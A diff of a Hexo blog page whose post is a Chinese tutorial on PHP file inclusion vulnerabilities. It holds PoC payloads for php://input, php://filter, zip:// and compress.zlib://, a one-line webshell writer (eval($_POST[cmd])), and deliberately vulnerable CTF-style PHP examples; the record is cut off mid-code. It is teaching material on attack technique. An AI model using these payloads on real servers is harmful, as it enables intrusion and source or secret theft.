@@ -5,7 +5,11 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="浅析文件包含, hybcx&#39;s blog">
-    <meta name="description" content="">
+    <meta name="description" content="文件包含总结
+0x01 文件包含的概念：
+把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，无需再次编写函数。这一调用文件的过程被称为包含。
+1.1 文件包含的原理：
+文件包含漏洞产生的原因是在通过PHP函数引入文件时，由">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,27 +17,48 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
     <title>浅析文件包含 | hybcx&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
+    
 
-    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
-    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-    <link rel="stylesheet" type="text/css" href="/css/matery.css">
-    <link rel="stylesheet" type="text/css" href="/css/my.css">
 
-    <script src="/libs/jquery/jquery.min.js"></script>
+    <!-- bg-cover style     -->
 
-<meta name="generator" content="Hexo 6.3.0">
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
-
-
 
 
 <body>
@@ -45,7 +70,7 @@
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">hybcx&#39;s blog</span>
+                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
                 </a>
             </div>
             
@@ -135,6 +160,11 @@
       <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
     </a>
   </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
 </ul>
 
 
@@ -151,8 +181,6 @@
             
         </div>
     </div>
-
-    
 
     <ul class="menu-list mobile-menu-list">
         
@@ -330,99 +358,7 @@
 <main class="post-container content">
 
     
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-<style>
-    #articleContent h1::before,
-    #articleContent h2::before,
-    #articleContent h3::before,
-    #articleContent h4::before,
-    #articleContent h5::before,
-    #articleContent h6::before {
-        display: block;
-        content: " ";
-        height: 100px;
-        margin-top: -100px;
-        visibility: hidden;
-    }
-
-    #articleContent :focus {
-        outline: none;
-    }
-
-    .toc-fixed {
-        position: fixed;
-        top: 64px;
-    }
-
-    .toc-widget {
-        width: 345px;
-        padding-left: 20px;
-    }
-
-    .toc-widget .toc-title {
-        padding: 35px 0 15px 17px;
-        font-size: 1.5rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    .toc-widget ol {
-        padding: 0;
-        list-style: none;
-    }
-
-    #toc-content {
-        padding-bottom: 30px;
-        overflow: auto;
-    }
-
-    #toc-content ol {
-        padding-left: 10px;
-    }
-
-    #toc-content ol li {
-        padding-left: 10px;
-    }
-
-    #toc-content .toc-link:hover {
-        color: #42b983;
-        font-weight: 700;
-        text-decoration: underline;
-    }
-
-    #toc-content .toc-link::before {
-        background-color: transparent;
-        max-height: 25px;
-
-        position: absolute;
-        right: 23.5vw;
-        display: block;
-    }
-
-    #toc-content .is-active-link {
-        color: #42b983;
-    }
-
-    #floating-toc-btn {
-        position: fixed;
-        right: 15px;
-        bottom: 76px;
-        padding-top: 15px;
-        margin-bottom: 0;
-        z-index: 998;
-    }
-
-    #floating-toc-btn .btn-floating {
-        width: 48px;
-        height: 48px;
-    }
-
-    #floating-toc-btn .btn-floating i {
-        line-height: 48px;
-        font-size: 1.4rem;
-    }
-</style>
-<div class="row">
+    <div class="row">
     <div id="main-content" class="col s12 m12 l9">
         <!-- 文章内容详情 -->
 <div id="artDetail">
@@ -459,12 +395,32 @@
                 
 
                 
-
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-10-22
+                </div>
                 
 
                 
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    6.5k
+                </div>
+                
 
                 
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    26 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
             </div>
         </div>
         <hr class="clearfix">
@@ -485,24 +441,40 @@
 <p><strong>文件包含漏洞产生的原因是在通过PHP函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</strong></p>
 <h3 id="1-2-文件包含分类：">1.2 文件包含分类：</h3>
 <p><strong>文件包含分为本地文件包含和远程文件包含，而区分二者最简单的办法就是通过查看php.ini中是否开启了allow_ url_ include. 如果开启就有可能包含远程文件。远程文件包含需要php.ini中allow_ ur_ include=on, allow_ ur_ fopen = On。在php.ini中，allow_ url_ fopen默认一直是On,而allow_ url_ include从php5.2之后就默认为Off。</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">本地文件包含：包含服务器上的资源  //能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞（LFI）。<br>远程文件包含：通过HTTP协议包含其他地方的资源<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">本地文件包含：包含服务器上的资源  //能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞（LFI）。
+远程文件包含：通过HTTP协议包含其他地方的资源<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h3 id="1-3-文件包含函数：">1.3 文件包含函数：</h3>
 <p><strong>1,  include():找不到被包含文件时会产生警告(E_ WARNING) ;</strong><br>
 <strong>2，include_ once(): 与include () 类似，代码已经被包含则不会再次包含</strong><br>
 <strong>3，require():找不到被包含的文件时会产生致命错误(E_ COMPILE ERROR)</strong><br>
 <strong>4，require_ once():与require ()类似，代码已经被包含则不会再次包含</strong></p>
 <p><strong>思维导图：</strong></p>
-<p><img src="image-20230321185813902.png" alt="image-20230321185813902"></p>
+<p><img src="/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321185813902.png" alt="image-20230321185813902"></p>
 <h2 id="0x02-PHP伪协议：">0x02 PHP伪协议：</h2>
 <p><strong>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</strong></p>
 <h3 id="2-1-php-input">2.1 php://input</h3>
 <p><strong>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">poc：<br>?file=php://input<br>[POST DATA] &lt;?php phpinfo();?&gt;<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230321192756427.png" alt="image-20230321192756427"></p>
+<pre class="line-numbers language-none"><code class="language-none">poc：
+?file=php://input
+[POST DATA] &lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321192756427.png" alt="image-20230321192756427"></p>
 <p><strong>注：利用php://input还可以写入php木马,即在post中传入如下代码：</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt;<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>例子：</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//test.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);<br><span class="hljs-variable">$a</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"a"</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">'r'</span>)) === <span class="hljs-string">'I want flag'</span>){<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">"success\n"</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>}<br><br><span class="hljs-comment">//flag.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">'flag{flag_is_here}'</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">//test.php
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'I want flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"success\n"</span><span class="token punctuation">;</span>
+	<span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment">//flag.php</span>
+<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token class-name type-declaration">php</span>
+<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag{flag_is_here}'</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>审计test.php知，当参数$a不为空，且读取的文件中包含’I want flag’时，即可显示$flag。所以可以使用php://input得到原始的post数据,访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行来进行绕过。</strong><br>
 <strong>注：遇到file_get_contents()要想到用php://input绕过。</strong></p>
 <h3 id="2-2-php-filter">2.2 php://filter</h3>
@@ -538,15 +510,49 @@
 </tr>
 </tbody>
 </table>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">poc1:<br>?file=php://filter/resource=xxx.php<br>poc2:<br>?file=php://filter/read=convert.base64-encode/resource=xxx.php<br></code></pre></td></tr></tbody></table></figure>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里<br>就会用到php://filter。<br>php://filter读取文件源代码的时候<br>需要用到编码器<br>php://filter/resource=phpinfo.php<br>php://filter/read=convert.base64-encode/resource=phpinfo.php<br>php://filter 一般读取文件源代码，然后再进行审计<br>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。<br>可以直接用不带任何过滤器的filter伪协议<br>payload:file=php://filter/resource=flag.php<br>也可以用一些没有过滤掉的编码方式和转换方式<br>payload:file=php://filter/read=convert.quoted-printable-encode/resource=flag.php<br>payload:file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php<br></code></pre></td></tr></tbody></table></figure>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">怎么写入一句话木马?<br>$filename = $_GET['file'];<br>$content = $_GET['content'];<br>file_put_contents($filename,"&lt;?php exit();".$content);<br><br>exit() 退出程序<br>这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配<br>置文件等等不允许用户直接访问的文件当中。<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">poc1:
+?file=php://filter/resource=xxx.php
+poc2:
+?file=php://filter/read=convert.base64-encode/resource=xxx.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里
+就会用到php://filter。
+php://filter读取文件源代码的时候
+需要用到编码器
+php://filter/resource=phpinfo.php
+php://filter/read=convert.base64-encode/resource=phpinfo.php
+php://filter 一般读取文件源代码，然后再进行审计
+php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。
+可以直接用不带任何过滤器的filter伪协议
+payload:file=php://filter/resource=flag.php
+也可以用一些没有过滤掉的编码方式和转换方式
+payload:file=php://filter/read=convert.quoted-printable-encode/resource=flag.php
+payload:file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">怎么写入一句话木马?
+$filename = $_GET['file'];
+$content = $_GET['content'];
+file_put_contents($filename,"&lt;?php exit();".$content);
+
+exit() 退出程序
+这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配
+置文件等等不允许用户直接访问的文件当中。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>exit死亡绕过参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163">https://xz.aliyun.com/t/8163</a></strong></p>
 <p><strong>POC1直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取POC2中方法将文件内容进行base64编码后显示在浏览器上，再自行解码。</strong></p>
 <p><strong>注：更多php://filter用法可参考：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></strong></p>
 <p><strong>eg1:</strong></p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;meta charset=<span class="hljs-string">"utf8"</span>&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"php://input"</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"zip://"</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"phar://"</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"data:"</span>)){<br>	<span class="hljs-keyword">exit</span>(<span class="hljs-string">'hacker!'</span>);<br>}<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>){<br>	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>}<span class="hljs-keyword">else</span>{<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;a href="?file=flag.php"&gt;tips&lt;/a&gt;'</span>;<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230321193810165.png" alt="image-20230321193810165"></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"zip://"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phar://"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+	<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="?file=flag.php"&gt;tips&lt;/a&gt;'</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321193810165.png" alt="image-20230321193810165"></p>
 <p><strong>尝试payload：?file=php://filter/resource=flag.php，发现无法显示内容</strong>：</p>
 <p><strong>尝试payload：?file=php://filter/read=convert.base64-encode/resource=flag.php，得到一串base64字符，解码得flag在flag.php源码中的注释里：</strong></p>
 <h3 id="2-3-zip">2.3 zip://</h3>
@@ -560,10 +566,54 @@
 相同的类型的还有zlib://和bzip2://
 file=compress.zlib://flag.php
 </code></pre>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">poc:<br>zip://[压缩包绝对路径]#[压缩包内文件]<br>?file=zip://D:\zip.jpg%23phpinfo.txt<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">poc:
+zip://[压缩包绝对路径]#[压缩包内文件]
+?file=zip://D:\zip.jpg%23phpinfo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><strong>例子：</strong></p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br>&lt;meta charset=<span class="hljs-string">"utf8"</span>&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$file</span>) <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;a href="?file=upload"&gt;upload?&lt;/a&gt;'</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"input"</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">"filter"</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"data"</span>)<span class="hljs-comment">/*||stristr($file,"phar")*/</span>){<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">"hick?"</span>;<br>	<span class="hljs-keyword">exit</span>();<br>}<span class="hljs-keyword">else</span>{<br>	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">".php"</span>);<br>}<br><span class="hljs-meta">?&gt;</span><br>&lt;!-- flag在当前目录的某个文件中 --&gt;<br></code></pre></td></tr></tbody></table></figure>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//upload.php</span><br>&lt;meta charset=<span class="hljs-string">"utf-8"</span>&gt;<br>&lt;form action=<span class="hljs-string">"upload.php"</span> method=<span class="hljs-string">"post"</span> enctype=<span class="hljs-string">"multipart/form-data"</span> &gt;<br>	 &lt;input type=<span class="hljs-string">"file"</span> name=<span class="hljs-string">"fupload"</span> /&gt;<br> 	&lt;input type=<span class="hljs-string">"submit"</span> value=<span class="hljs-string">"upload!"</span> /&gt;<br>&lt;/form&gt;<br>you can upload jpg,png,zip....&lt;br /&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'fupload'</span>] ) ) {<br>    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'fupload'</span> ][ <span class="hljs-string">'name'</span> ];         <span class="hljs-comment">//文件名</span><br>    <span class="hljs-variable">$uploaded_ext</span>  = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-title function_ invoke__">strrpos</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">'.'</span> ) + <span class="hljs-number">1</span>);   <span class="hljs-comment">//文件后缀</span><br>    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'fupload'</span> ][ <span class="hljs-string">'size'</span> ];         <span class="hljs-comment">//文件大小</span><br>    <span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'fupload'</span> ][ <span class="hljs-string">'tmp_name'</span> ];     <span class="hljs-comment">// 存储在服务器的文件的临时副本的名称</span><br>    <span class="hljs-variable">$target_path</span> = <span class="hljs-string">"uploads\\"</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">rand</span>())).<span class="hljs-string">"."</span>.<span class="hljs-variable">$uploaded_ext</span>;<br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"jpg"</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"jpeg"</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"png"</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"zip"</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) ) {<br>        <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$uploaded_tmp</span>, <span class="hljs-variable">$target_path</span> ) ) {<span class="hljs-comment">// No</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;upload error&lt;/pre&gt;'</span>;<br>        }<br>        <span class="hljs-keyword">else</span> {<span class="hljs-comment">// Yes!</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;"</span>.<span class="hljs-title function_ invoke__">dirname</span>(<span 